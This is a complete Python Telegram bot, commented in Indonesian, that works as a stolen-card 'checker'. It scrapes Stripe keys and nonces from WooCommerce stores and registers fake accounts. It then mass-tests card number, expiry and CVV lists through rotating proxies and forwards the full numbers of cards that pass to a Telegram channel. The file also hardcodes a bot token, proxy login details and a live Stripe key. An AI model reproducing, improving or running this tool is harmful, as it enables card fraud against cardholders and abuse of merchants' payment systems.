import telebot
import requests
import random
import time
import re
import uuid
import string
import logging
import html
from fake_useragent import UserAgent
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

# ===== CONFIG =====
BOT_TOKEN = "8570035230:AAGHLWAc-WcQikFR_F3RYi3flCJI3cbjatg"
CT = "5077777510"               # Notif proxy rotate ke chat pribadi
CH = "-1003589620654"

# ===== PROXY LIST DEFAULT (fallback) =====
PROXIES_LIST_DEFAULT = [
    "http://brd-customer-hl_055daa6d-zone-residential:g27d88afiv91@brd.superproxy.io:33335",
]

PROXY_FILE = "proxy.txt"

# Fungsi normalisasi proxy - SUPPORT host:port:user:pass seperti request terbaru kamu
def normalize_proxy(raw):
    raw = raw.strip()
    if not raw or raw.startswith('#'):
        return None

    # Hapus prefix jika ada
    if raw.lower().startswith(('http://', 'https://', 'socks5://')):
        raw = raw.split('://', 1)[1]

    # Jika sudah punya @ → anggap benar
    if '@' in raw:
        if not raw.startswith('http://'):
            raw = 'http://' + raw
        logging.info(f"Proxy sudah format benar: {raw}")
        return raw

    # Format baru kamu: host:port:user:pass
    parts = raw.split(':')
    if len(parts) == 4:
        host = parts[0]
        port = parts[1]
        user = parts[2]
        pw = parts[3]
        normalized = f"http://{user}:{pw}@{host}:{port}"
        logging.info(f"Normalized host:port:user:pass → {normalized}")
        return normalized

    # Format lama user:pass:host:port (masih support)
    if len(parts) == 4:
        user = parts[0]
        pw = parts[1]
        host = parts[2]
        port = parts[3]
        normalized = f"http://{user}:{pw}@{host}:{port}"
        logging.info(f"Normalized user:pass:host:port → {normalized}")
        return normalized

    # Tanpa auth: host:port
    if len(parts) == 2:
        host, port = parts
        normalized = f"http://{host}:{port}"
        logging.info(f"Normalized tanpa auth → {normalized}")
        return normalized

    logging.warning(f"Format proxy invalid, di-skip: {raw}")
    return None

# Load proxies dari file + normalisasi
def load_proxies():
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, 'r', encoding='utf-8') as f:
                lines = f.read().splitlines()
                proxies = [normalize_proxy(line) for line in lines]
                proxies = [p for p in proxies if p]  # hapus None
                if proxies:
                    logging.info(f"Loaded {len(proxies)} proxy valid dari proxy.txt")
                    return proxies
        except Exception as e:
            logging.error(f"Error load proxy.txt: {e}")
    logging.info("proxy.txt tidak ditemukan/kosong → pakai default")
    return PROXIES_LIST_DEFAULT

# Load awal
PROXIES_LIST = load_proxies()

NOTIFY_PROXY_ROTATION = False
PROXY_ROTATE_EVERY = 3
DOMAIN_ROTATE_EVERY = 3
MAX_CARDS = 20000
THREADS = 30
DELAY_AFTER_5_CARDS = 5

proxy_cycle = cycle(PROXIES_LIST)
mass_proxy_counter = 0
current_proxy = None

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

bot = telebot.TeleBot(BOT_TOKEN)
user_domains = {}

def send_telegram(message, chat_id):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        logger.error(f"Telegram error: {e}")

def get_next_proxy():
    global mass_proxy_counter, current_proxy
    mass_proxy_counter += 1

    if mass_proxy_counter % PROXY_ROTATE_EVERY == 1 or current_proxy is None:
        current_proxy = next(proxy_cycle)
        if '@' in current_proxy:
            visible_proxy = current_proxy.split('@')[1]
            auth_part = current_proxy.split('@')[0].split('://')[1]
            user, _ = auth_part.split(':')
            masked_proxy = f"http://{user}:***@{visible_proxy}"
        else:
            masked_proxy = current_proxy

        logger.info(f"Using new proxy for request #{mass_proxy_counter}: {current_proxy}")

        if NOTIFY_PROXY_ROTATION:
            tg_msg = (
                f"🔄 **Proxy Rotated!**\n"
                f"Request #{mass_proxy_counter}\n"
                f"New proxy: `{masked_proxy}`\n"
                f"Domain being checked: `{current_domain if 'current_domain' in globals() else 'N/A'}`"
            )
            
    proxies = {
        "http": current_proxy,
        "https": current_proxy,
    }
    return proxies, current_proxy

def escape_html(text):
    return html.escape(str(text))

def get_stripe_key(domain, session=None):
    logger.debug(f"Getting Stripe key for domain: {domain}")

    if session is None:
        session = requests.Session()
        session.headers.update({'User-Agent': UserAgent().random})

    urls_to_try = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/wp-admin/admin-ajax.php?action=wc_stripe_get_stripe_params",
        f"https://{domain}/?wc-ajax=get_stripe_params"
    ]
    
    patterns = [
        r'pk_live_[a-zA-Z0-9_]+',
        r'stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'wc_stripe_params[^}]*"key":"(pk_live_[^"]+)"',
        r'"publishableKey":"(pk_live_[^"]+)"',
        r'var stripe = Stripe[\'"]((pk_live_[^\'"]+))[\'"]'
    ]
    
    for url in urls_to_try:
        try:
            logger.debug(f"Trying URL: {url}")
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:                
                        key_match = re.search(r'pk_live_[a-zA-Z0-9_]+', match.group(0))
                        if key_match:
                            logger.debug(f"Found Stripe key: {key_match.group(0)}")
                            return key_match.group(0)
        except Exception as e:
            logger.error(f"Error getting Stripe key from {url}: {e}")
            continue
    
    logger.debug("Using default Stripe key")
    return "pk_live_51RLYZtRqibo0xXJIAAU1lQ1Y0tKyhaBiRx0tZMWeHFsx2oYU8JdBZkLASG4wBSOmN8hvj8LoPsbmj4aqmbrTAyTq00ASY6ommU"

def extract_nonce_from_page(html_content, domain):
    logger.debug(f"Extracting nonce from {domain}")
    patterns = [
        r'createAndConfirmSetupIntentNonce["\']?:\s*["\']([^"\']+)["\']',
        r'wc_stripe_create_and_confirm_setup_intent["\']?[^}]*nonce["\']?:\s*["\']([^"\']+)["\']',
        r'name=["\']_ajax_nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'name=["\']woocommerce-login-nonce["\'][^>]*value=["\']([^"\']+)["\']',
        r'var wc_stripe_params = [^}]*"nonce":"([^"]+)"',
        r'var stripe_params = [^}]*"nonce":"([^"]+)"',
        r'nonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, html_content)
        if match:
            logger.debug(f"Found nonce: {match.group(1)}")
            return match.group(1)
    
    logger.debug("No nonce found")
    return None

def generate_random_credentials():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{username}@gmail.com"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, email, password

def register_account(domain, session):
    logger.debug(f"Registering account on {domain}")
    try:        
        reg_response = session.get(f"https://{domain}/my-account/", verify=False)
                
        reg_nonce_patterns = [
            r'name="woocommerce-register-nonce" value="([^"]+)"',
            r'name=["\']_wpnonce["\'][^>]*value="([^"]+)"',
            r'register-nonce["\']?:\s*["\']([^"\']+)["\']'
        ]
        
        reg_nonce = None
        for pattern in reg_nonce_patterns:
            match = re.search(pattern, reg_response.text)
            if match:
                reg_nonce = match.group(1)
                break
        
        if not reg_nonce:
            logger.debug("Could not extract registration nonce")
            return False, "Could not extract registration nonce"
                
        username, email, password = generate_random_credentials()
        
        reg_data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register'
        }
        
        reg_result = session.post(
            f"https://{domain}/my-account/",
            data=reg_data,
            headers={'Referer': f'https://{domain}/my-account/'},
            verify=False
        )
        
        if 'Log out' in reg_result.text or 'My Account' in reg_result.text:
            logger.debug("Registration successful")
            return True, "Registration successful"
        else:
            logger.debug("Registration failed")
            return False, "Registration failed"
            
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return False, f"Registration error: {str(e)}"

def process_card_enhanced(domain, ccx, use_registration=True):
    global mass_proxy_counter, current_proxy

    logger.debug(f"Processing card for domain: {domain}")
    ccx = ccx.strip()
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        logger.error("Invalid card format")
        return {
            "Response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
            "Status": "Declined"
        }
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    user_agent = UserAgent().random
    stripe_mid = str(uuid.uuid4())
    stripe_sid = str(uuid.uuid4()) + str(int(time.time()))

    proxies, proxy_used = get_next_proxy()

    session = requests.Session()
    session.headers.update({'User-Agent': user_agent})
    
    if proxies:
        session.proxies.update(proxies)

    stripe_key = get_stripe_key(domain, session=session)

    if use_registration:
        registered, reg_message = register_account(domain, session)

    payment_urls = [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/my-account/"
    ]
    
    nonce = None
    for url in payment_urls:
        try:
            logger.debug(f"Trying to get nonce from: {url}")
            response = session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                nonce = extract_nonce_from_page(response.text, domain)
                if nonce:
                    break
        except Exception as e:
            logger.error(f"Error getting nonce from {url}: {e}")
            continue
    
    if not nonce:
        logger.error("Failed to extract nonce from site")
        return {"Response": "Failed to extract nonce from site", "Status": "Declined"}

    payment_data = {
        'type': 'card',
        'card[number]': n,
        'card[cvc]': cvc,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][country]': 'US',
        'billing_details[address][postal_code]': '10080',
        'billing_details[name]': 'Sahil Pro',
        'pasted_fields': 'number',
        'payment_user_agent': f'stripe.js/{uuid.uuid4().hex[:8]}; stripe-js-v3/{uuid.uuid4().hex[:8]}; payment-element; deferred-intent',
        'referrer': f'https://{domain}',
        'time_on_page': str(int(time.time()) % 100000),
        'key': stripe_key,
        '_stripe_version': '2024-06-20',
        'guid': str(uuid.uuid4()),
        'muid': stripe_mid,
        'sid': stripe_sid
    }

    try:
        logger.debug("Creating payment method")
        pm_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            data=payment_data,
            headers={
                'User-Agent': user_agent,
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
            },
            timeout=15,
            verify=False
        )
        pm_data = pm_response.json()

        if 'id' not in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown payment method error')
            logger.error(f"Payment method error: {error_msg}")
            return {"Response": error_msg, "Status": "Declined"}

        payment_method_id = pm_data['id']
        logger.debug(f"Payment method created: {payment_method_id}")
    except Exception as e:
        logger.error(f"Payment Method Creation Failed: {e}")
        return {"Response": f"Payment Method Creation Failed: {str(e)}", "Status": "Declined"}
    
    endpoints = [
        {'url': f'https://{domain}/', 'params': {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}},
        {'url': f'https://{domain}/wp-admin/admin-ajax.php', 'params': {}},
        {'url': f'https://{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 'params': {}}
    ]
    
    data_payloads = [
        {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        },
        {
            'action': 'wc_stripe_create_setup_intent',
            'payment_method_id': payment_method_id,
            '_wpnonce': nonce,
        }
    ]

    for endpoint in endpoints:
        for data_payload in data_payloads:
            try:
                logger.debug(f"Trying endpoint: {endpoint['url']} with payload: {data_payload}")
                setup_response = session.post(
                    endpoint['url'],
                    params=endpoint.get('params', {}),
                    headers={
                        'User-Agent': user_agent,
                        'Referer': f'https://{domain}/my-account/add-payment-method/',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'origin': f'https://{domain}',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=data_payload,
                    timeout=15,
                    verify=False
                )
                                
                try:
                    setup_data = setup_response.json()
                    logger.debug(f"Setup response: {setup_data}")
                except:
                    setup_data = {'raw_response': setup_response.text}
                    logger.debug(f"Setup raw response: {setup_response.text}")
              
                if setup_data.get('success', False):
                    data_status = setup_data['data'].get('status')
                    if data_status == 'requires_action':
                        logger.debug("3D authentication required")
                        return {"Response": "3D", "Status": "Declined"}
                    elif data_status == 'succeeded':
                        logger.debug("Payment succeeded")
                        tg_msg = (
                            "✅ CARD AUTHENTICATED\n\n"
                            f"💳 Card: `{ccx}`\n"
                            f"🔥 Status: LIVE ✅"
                        )
                        send_telegram(tg_msg, CH)                        
                        return {"Response": "Card Added ", "Status": "Approved"}
                    elif 'error' in setup_data['data']:
                        error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                        logger.error(f"Payment error: {error_msg}")
                        return {"Response": error_msg, "Status": "Declined"}

                if not setup_data.get('success') and 'data' in setup_data and 'error' in setup_data['data']:
                    error_msg = setup_data['data']['error'].get('message', 'Unknown error')
                    logger.error(f"Payment error: {error_msg}")
                    return {"Response": error_msg, "Status": "Declined"}

                if setup_data.get('status') in ['succeeded', 'success']:
                    logger.debug("Payment succeeded")
                    tg_msg = (
                        "✅ CARD AUTHENTICATED\n\n"
                        f"💳 Card: `{ccx}`\n"
                        f"🔥 Status: LIVE ✅"
                    )
                    send_telegram(tg_msg, CH)
                    return {"Response": "Card Added", "Status": "Approved"}

            except Exception as e:
                logger.error(f"Setup error: {e}")
                continue

    logger.error("All payment attempts failed")
    return {"Response": "All payment attempts failed", "Status": "Declined"}

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,
        "👋 **Selamat datang di AutoStripe Checker (persis Flask)**\n\n"
        "Perintah:\n"
        "• `/url domain1.com domain2.com ...` → Set domain\n"
        "• `/cc domain.com card` → Single check\n"
        "• Kirim file .txt → Mass check (max 20000)\n"
        "• `/addproxy` → reply file .txt (format host:port:user:pass atau user:pass:host:port) untuk update proxy\n\n"
        "Proxy dari proxy.txt akan otomatis diprioritaskan.")

@bot.message_handler(commands=['url'])
def set_urls(message):
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Format: `/url domain1.com domain2.com ...`")
        return

    user_domains[message.from_user.id] = args
    bot.reply_to(message, f"✅ Domain diset:\n{', '.join(args)}")

@bot.message_handler(commands=['addproxy'])
def add_proxy(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Balas pesan ini dengan file .txt berisi proxy (format host:port:user:pass)!")
        return

    doc = message.reply_to_message.document
    if not doc.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "❌ Harus file .txt!")
        return

    try:
        file_info = bot.get_file(doc.file_id)
        downloaded = bot.download_file(file_info.file_path)

        raw_lines = downloaded.decode('utf-8', errors='ignore').splitlines()
        proxies_new = []
        for line in raw_lines:
            norm = normalize_proxy(line)
            if norm:
                proxies_new.append(norm)

        if not proxies_new:
            bot.reply_to(message, "❌ Tidak ada proxy valid di file!")
            return

        # Simpan raw ke file
        with open(PROXY_FILE, 'w', encoding='utf-8') as f:
            f.write('\n'.join(raw_lines))

        # Reload
        global PROXIES_LIST, proxy_cycle
        PROXIES_LIST = load_proxies()
        proxy_cycle = cycle(PROXIES_LIST)

        bot.reply_to(message, f"✅ Sukses tambah {len(proxies_new)} proxy valid!\nTotal sekarang: {len(PROXIES_LIST)}\nProxy langsung aktif.")
    except Exception as e:
        bot.reply_to(message, f"❌ Gagal proses file proxy:\n{str(e)}")

@bot.message_handler(commands=['cc'])
def single_check(message):
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        bot.reply_to(message, "Format: `/cc domain.com card`")
        return

    domain = args[1]
    cc = args[2]

    if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
        bot.reply_to(message, "Format kartu salah!")
        return

    bot.reply_to(message, f"🔍 Cek single: {domain} | {cc}")
    result = process_card_enhanced(domain, cc)
    reply = f"**Result**\nDomain: `{domain}`\nCard: `{cc}`\nResponse: `{escape_html(result['Response'])}`\nStatus: **{result['Status']}** {'✅' if result['Status'] == 'Approved' else '❌'}"
    bot.reply_to(message, reply, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def mass_check(message):
    doc = message.document
    if not doc.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "Kirim file .txt saja!")
        return

    user_id = message.from_user.id
    if user_id not in user_domains or not user_domains[user_id]:
        bot.reply_to(message, "Set domain dulu pakai /url!")
        return

    domains = user_domains[user_id]

    file_info = bot.get_file(doc.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = [line.strip() for line in downloaded.decode('utf-8', errors='ignore').splitlines() if line.strip() and '|' in line]

    if not cards or len(cards) > MAX_CARDS:
        bot.reply_to(message, f"File kosong atau melebihi {MAX_CARDS} kartu!")
        return

    bot.reply_to(message, f"🔥 Mulai mass check {len(cards)} kartu")

    approved = declined = 0

    def check_card(card, idx):
        nonlocal approved, declined
        domain_idx = (idx - 1) // DOMAIN_ROTATE_EVERY % len(domains)
        domain = domains[domain_idx]

        result = process_card_enhanced(domain, card)
        status = result['Status']

        reply = f"**Kartu ke-{idx}/{len(cards)}** | {domain}\nCard: `{card}`\nResponse: `{escape_html(result['Response'])}`\nStatus: **{status}** {'✅' if status == 'Approved' else '❌'}"
        bot.send_message(message.chat.id, reply, parse_mode="Markdown")

        if status == 'Approved':
            approved += 1
        else:
            declined += 1

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for i in range(0, len(cards), THREADS):
            batch = cards[i:i+THREADS]
            for j, card in enumerate(batch):
                futures.append(executor.submit(check_card, card, i + j + 1))

            for future in as_completed(futures):
                future.result()

            time.sleep(DELAY_AFTER_5_CARDS)

    bot.send_message(message.chat.id,
        f"**Selesai!**\nTotal: {len(cards)}\nApproved: {approved} ✅\nDeclined: {declined} ❌",
        parse_mode="Markdown")

print("🤖 AutoStripe Bot (SUPPORT host:port:user:pass di proxy.txt) running...")
bot.infinity_polling()

